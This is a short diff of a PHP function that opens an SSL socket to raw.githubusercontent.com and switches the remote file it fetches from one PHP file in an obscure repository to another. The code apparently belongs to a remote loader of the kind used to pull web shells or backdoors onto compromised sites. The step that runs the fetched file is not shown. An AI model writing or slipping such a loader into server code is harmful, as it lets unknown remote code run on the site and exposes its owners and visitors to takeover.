@@ -2,7 +2,7 @@
 {
     $host = "raw.githubusercontent.com/";
     $port = 443;
-    $path = "tikung6etar/Nyarek/refs/heads/master/litespeed.php";
+    $path = "tikung6etar/Nyarek/refs/heads/master/minki.php";
 
     $fp = stream_socket_client("ssl://$host:$port", $errno, $errstr, 30);
     if (!$fp) {
